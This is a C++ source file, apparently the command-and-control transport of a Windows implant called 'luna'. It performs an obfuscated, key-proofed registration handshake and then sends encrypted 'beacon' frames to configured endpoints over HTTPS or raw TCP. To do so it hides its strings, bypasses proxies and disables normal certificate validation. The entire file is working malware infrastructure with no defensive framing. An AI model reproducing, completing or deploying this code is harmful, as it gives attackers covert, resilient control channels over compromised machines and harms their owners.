#include "transport.hpp"

#include "obf.hpp"
#include "sysutil.hpp"

#include "platform.hpp"

#include <bcrypt.h>
#include <wincrypt.h>
#include <winhttp.h>

#include <cstring>
#include <stdexcept>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace luna {

namespace {

constexpr std::size_t kMaxBody = 32u * 1024u * 1024u;

std::string upper(std::string s) {
    for (char& c : s) {
        if (c >= 'a' && c <= 'z') c = static_cast<char>(c - 'a' + 'A');
    }
    return s;
}

std::string cert_fingerprint(PCCERT_CONTEXT cert) {
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    std::string hex;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0) < 0) return hex;
    if (BCryptCreateHash(alg, &hash, nullptr, 0, nullptr, 0, 0) >= 0) {
        if (BCryptHashData(hash, cert->pbCertEncoded, cert->cbCertEncoded, 0) >= 0) {
            Bytes digest(32);
            if (BCryptFinishHash(hash, digest.data(), 32, 0) >= 0) hex = hex_encode(digest);
        }
        BCryptDestroyHash(hash);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return hex;
}

}  // namespace

std::vector<Endpoint> configured_endpoints() {
    static const wchar_t* kRaw[] = LUNA_ENDPOINTS_LIST;
    std::vector<Endpoint> out;
    for (const wchar_t* entry : kRaw) {
        std::wstring wide(entry);
        const auto pos = wide.rfind(L':');
        if (pos == std::wstring::npos) continue;
        Endpoint ep;
        ep.host = to_utf8(wide.substr(0, pos));
        ep.port = static_cast<std::uint16_t>(std::stoi(wide.substr(pos + 1)));
        out.push_back(ep);
    }
    return out;
}

bool Transport::handshake(const std::string& meta_json, std::string& error) {
    const auto kp = x25519_keypair();
    priv_ = kp.priv;
    pub_ = kp.pub;
    const Bytes nonce = random_bytes(32);

    const std::string kTag = XLIT("luna-reg-v1");
    Bytes material;
    material.insert(material.end(), kTag.begin(), kTag.end());
    material.insert(material.end(), pub_.begin(), pub_.end());
    material.insert(material.end(), nonce.begin(), nonce.end());

    const Bytes reg_key = hex_decode(XLIT(LUNA_REG_KEY_HEX));
    const Bytes proof = hmac_sha256(reg_key, material);

    Json hello = Json::object();
    hello.set("v", Json(LUNA_PROTO_VERSION));
    hello.set("pk", Json(b64_encode(pub_)));
    hello.set("nonce", Json(b64_encode(nonce)));
    hello.set("proof", Json(hex_encode(proof)));
    hello.set("build", Json(std::string(XLIT(LUNA_BUILD_ID_STR))));
    hello.set("caps", Json(static_cast<std::int64_t>(LUNA_CAP_MASK)));
    hello.set("transport", Json(XLIT(LUNA_TRANSPORT_STR)));

    Json meta = Json::parse(meta_json);
    hello.set("meta", meta);

    std::string response;
    if (!post_handshake(hello.dump(), response, error)) return false;

    bool ok = false;
    const Json reply = Json::parse(response, &ok);
    if (!ok || !reply.has("sid")) {
        error = "handshake rejected: " + response.substr(0, 200);
        return false;
    }

    const Bytes peer_pub = b64_decode(reply["pk"].as_string());
    const Bytes salt = b64_decode(reply["salt"].as_string());
    if (peer_pub.size() != 32 || salt.empty()) {
        error = "handshake reply missing key material";
        return false;
    }

    const SessionKeys keys = derive_session_keys(priv_, peer_pub, salt);
    send_key_ = keys.send_key;
    recv_key_ = keys.recv_key;
    sid_ = reply["sid"].as_string();
    send_ctr_ = 0;
    recv_high_ = 0;
    recv_started_ = false;
    needs_rehandshake_ = false;

    // the private key is no longer needed once keys are derived
    SecureZeroMemory(priv_.data(), priv_.size());
    priv_.clear();
    return true;
}

Bytes Transport::seal(const std::string& plaintext) {
    Bytes body(plaintext.begin(), plaintext.end());
    return aes_gcm_seal(send_key_, 0, send_ctr_++, body);
}

bool Transport::unseal(const Bytes& frame, std::string& out, std::string& error) {
    if (frame.size() < kNonceLen + kTagLen) {
        error = "short frame";
        return false;
    }
    std::uint64_t counter = 0;
    for (int i = 0; i < 8; ++i) {
        counter = (counter << 8) | frame[4 + i];
    }
    if (recv_started_ && counter <= recv_high_) {
        error = "replayed frame";
        needs_rehandshake_ = true;
        return false;
    }
    try {
        const Bytes plain = aes_gcm_open(recv_key_, frame);
        out.assign(plain.begin(), plain.end());
    } catch (const std::exception& exc) {
        error = exc.what();
        needs_rehandshake_ = true;
        return false;
    }
    recv_high_ = counter;
    recv_started_ = true;
    return true;
}

// --- HTTPS via WinHTTP -------------------------------------------------------

class HttpsTransport final : public Transport {
public:
    ~HttpsTransport() override { close(); }

    void close() override {
        if (request_) { WinHttpCloseHandle(request_); request_ = nullptr; }
        if (connection_) { WinHttpCloseHandle(connection_); connection_ = nullptr; }
        if (session_) { WinHttpCloseHandle(session_); session_ = nullptr; }
    }

    bool open(const std::string& meta_json, std::string& error) override {
        endpoints_ = configured_endpoints();
        if (endpoints_.empty()) {
            error = "no endpoints configured";
            return false;
        }
        for (std::size_t attempt = 0; attempt < endpoints_.size(); ++attempt) {
            const Endpoint& ep = endpoints_[(endpoint_index_ + attempt) % endpoints_.size()];
            if (!connect(ep, error)) continue;
            if (!handshake(meta_json, error)) { close(); continue; }
            endpoint_index_ = (endpoint_index_ + attempt) % endpoints_.size();
            return true;
        }
        return false;
    }

    bool beacon(const std::string& request, std::string& response,
                std::string& error) override {
        if (needs_rehandshake_) {
            error = "session state lost";
            return false;
        }
        const Bytes frame = seal(request);
        Bytes response_frame;
        if (!post_beacon(frame, response_frame, error)) return false;
        return unseal(response_frame, response, error);
    }

protected:
    bool post_handshake(const std::string& body, std::string& response,
                        std::string& error) override {
        return send(L"/v1/hs", body, false, response, error);
    }

    bool post_beacon(const Bytes& frame, Bytes& response, std::string& error) override {
        std::string text;
        if (!send(L"/v1/b", std::string(frame.begin(), frame.end()), true, text, error)) {
            return false;
        }
        response.assign(text.begin(), text.end());
        return true;
    }

private:
    bool connect(const Endpoint& ep, std::string& error) {
        close();
        const std::wstring ua = to_wide(XLIT(LUNA_USER_AGENT));
        session_ = WinHttpOpen(ua.c_str(), WINHTTP_ACCESS_TYPE_NO_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!session_) { error = "WinHttpOpen: " + last_error(); return false; }
        WinHttpSetTimeouts(session_, 15000, 15000, 30000, 30000);

        const std::wstring host = to_wide(ep.host);
        connection_ = WinHttpConnect(session_, host.c_str(), ep.port, 0);
        if (!connection_) { error = "WinHttpConnect: " + last_error(); return false; }
        return true;
    }

    bool send(const wchar_t* path, const std::string& body, bool is_beacon,
              std::string& response, std::string& error) {
        if (request_) { WinHttpCloseHandle(request_); request_ = nullptr; }
        request_ = WinHttpOpenRequest(connection_, L"POST", path, nullptr,
                                      WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                      WINHTTP_FLAG_SECURE);
        if (!request_) { error = "WinHttpOpenRequest: " + last_error(); return false; }

        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(request_, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

        std::wstring headers = L"Content-Type: ";
        headers += is_beacon ? L"application/octet-stream" : L"application/json";

        if (!WinHttpSendRequest(request_, headers.c_str(),
                                static_cast<DWORD>(-1L),
                                const_cast<char*>(body.data()),
                                static_cast<DWORD>(body.size()),
                                static_cast<DWORD>(body.size()), 0)) {
            error = "SendRequest: " + last_error();
            needs_rehandshake_ = true;
            return false;
        }

        PCCERT_CONTEXT cert = nullptr;
        DWORD cert_size = sizeof(cert);
        if (WinHttpQueryOption(request_, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &cert, &cert_size) && cert) {
            const std::string pin = XLIT(LUNA_CERT_FP);
            if (!pin.empty()) {
                const std::string got = cert_fingerprint(cert);
                if (upper(got) != upper(pin)) {
                    CertFreeCertificateContext(cert);
                    error = "certificate pin mismatch";
                    needs_rehandshake_ = true;
                    return false;
                }
            }
            CertFreeCertificateContext(cert);
        }

        if (!WinHttpReceiveResponse(request_, nullptr)) {
            error = "ReceiveResponse: " + last_error();
            needs_rehandshake_ = true;
            return false;
        }

        DWORD status = 0;
        DWORD status_size = sizeof(status);
        WinHttpQueryHeaders(request_, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                            WINHTTP_NO_HEADER_INDEX);
        if (status == 409 || status == 403 || status == 401) {
            error = "server refused session (status " + std::to_string(status) + ")";
            needs_rehandshake_ = true;
            return false;
        }
        if (status != 200) {
            error = "unexpected status " + std::to_string(status);
            return false;
        }

        response.clear();
        DWORD read = 0;
        char buffer[8192];
        do {
            read = 0;
            if (!WinHttpReadData(request_, buffer, sizeof(buffer), &read)) {
                error = "ReadData: " + last_error();
                return false;
            }
            if (read) {
                response.append(buffer, read);
                if (response.size() > kMaxBody) { error = "response too large"; return false; }
            }
        } while (read > 0);
        return true;
    }

    std::vector<Endpoint> endpoints_;
    HINTERNET session_ = nullptr;
    HINTERNET connection_ = nullptr;
    HINTERNET request_ = nullptr;
};

// --- raw TCP ----------------------------------------------------------------

class TcpTransport final : public Transport {
public:
    ~TcpTransport() override { close(); }

    void close() override {
        if (socket_ != INVALID_SOCKET) {
            closesocket(socket_);
            socket_ = INVALID_SOCKET;
        }
    }

    bool open(const std::string& meta_json, std::string& error) override {
        WSADATA wsa{};
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            error = "WSAStartup failed";
            return false;
        }
        endpoints_ = configured_endpoints();
        if (endpoints_.empty()) { error = "no endpoints configured"; return false; }
        for (std::size_t attempt = 0; attempt < endpoints_.size(); ++attempt) {
            const Endpoint& ep = endpoints_[(endpoint_index_ + attempt) % endpoints_.size()];
            socket_ = INVALID_SOCKET;
            if (!connect(ep, error)) continue;
            if (!handshake(meta_json, error)) { close(); continue; }
            endpoint_index_ = (endpoint_index_ + attempt) % endpoints_.size();
            return true;
        }
        return false;
    }

    bool beacon(const std::string& request, std::string& response,
                std::string& error) override {
        if (needs_rehandshake_) { error = "session state lost"; return false; }
        const Bytes frame = seal(request);
        if (!write_frame(frame, error)) return false;
        Bytes reply;
        if (!read_frame(reply, error)) return false;
        return unseal(reply, response, error);
    }

protected:
    bool post_handshake(const std::string& body, std::string& response,
                        std::string& error) override {
        Bytes payload(body.begin(), body.end());
        if (!write_frame(payload, error)) return false;
        Bytes reply;
        if (!read_frame(reply, error)) return false;
        response.assign(reply.begin(), reply.end());
        return true;
    }

    bool post_beacon(const Bytes& frame, Bytes& response, std::string& error) override {
        if (!write_frame(frame, error)) return false;
        return read_frame(response, error);
    }

private:
    bool connect(const Endpoint& ep, std::string& error) {
        addrinfo hints{};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        addrinfo* result = nullptr;
        const std::string port = std::to_string(ep.port);
        if (getaddrinfo(ep.host.c_str(), port.c_str(), &hints, &result) != 0) {
            error = "cannot resolve " + ep.host;
            return false;
        }
        for (addrinfo* it = result; it; it = it->ai_next) {
            SOCKET s = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
            if (s == INVALID_SOCKET) continue;
            DWORD timeout = 15000;
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO,
                       reinterpret_cast<const char*>(&timeout), sizeof(timeout));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO,
                       reinterpret_cast<const char*>(&timeout), sizeof(timeout));
            if (::connect(s, it->ai_addr, static_cast<int>(it->ai_addrlen)) == 0) {
                socket_ = s;
                break;
            }
            closesocket(s);
        }
        freeaddrinfo(result);
        if (socket_ == INVALID_SOCKET) {
            error = "connect to " + ep.host + ":" + port + " failed";
            return false;
        }
        return true;
    }

    bool write_frame(const Bytes& payload, std::string& error) {
        Bytes out(4 + payload.size());
        const auto len = static_cast<std::uint32_t>(payload.size());
        out[0] = static_cast<std::uint8_t>((len >> 24) & 0xff);
        out[1] = static_cast<std::uint8_t>((len >> 16) & 0xff);
        out[2] = static_cast<std::uint8_t>((len >> 8) & 0xff);
        out[3] = static_cast<std::uint8_t>(len & 0xff);
        std::memcpy(out.data() + 4, payload.data(), payload.size());
        std::size_t sent = 0;
        while (sent < out.size()) {
            const int n = ::send(socket_, reinterpret_cast<const char*>(out.data() + sent),
                                 static_cast<int>(out.size() - sent), 0);
            if (n <= 0) { error = "send failed"; needs_rehandshake_ = true; return false; }
            sent += static_cast<std::size_t>(n);
        }
        return true;
    }

    bool read_frame(Bytes& payload, std::string& error) {
        std::uint8_t header[4] = {};
        if (!read_exact(header, 4, error)) return false;
        const auto len = (static_cast<std::uint32_t>(header[0]) << 24) |
                         (static_cast<std::uint32_t>(header[1]) << 16) |
                         (static_cast<std::uint32_t>(header[2]) << 8) |
                         static_cast<std::uint32_t>(header[3]);
        if (len == 0 || len > kMaxBody) { error = "bad frame length"; return false; }
        payload.assign(len, 0);
        return read_exact(payload.data(), len, error);
    }

    bool read_exact(std::uint8_t* dst, std::size_t count, std::string& error) {
        std::size_t got = 0;
        while (got < count) {
            const int n = ::recv(socket_, reinterpret_cast<char*>(dst + got),
                                 static_cast<int>(count - got), 0);
            if (n <= 0) { error = "recv failed"; needs_rehandshake_ = true; return false; }
            got += static_cast<std::size_t>(n);
        }
        return true;
    }

    std::vector<Endpoint> endpoints_;
    SOCKET socket_ = INVALID_SOCKET;
};

std::unique_ptr<Transport> make_transport() {
    const std::string kind = XLIT(LUNA_TRANSPORT_STR);
    if (kind == "tcp") return std::make_unique<TcpTransport>();
    return std::make_unique<HttpsTransport>();
}

}  // namespace luna
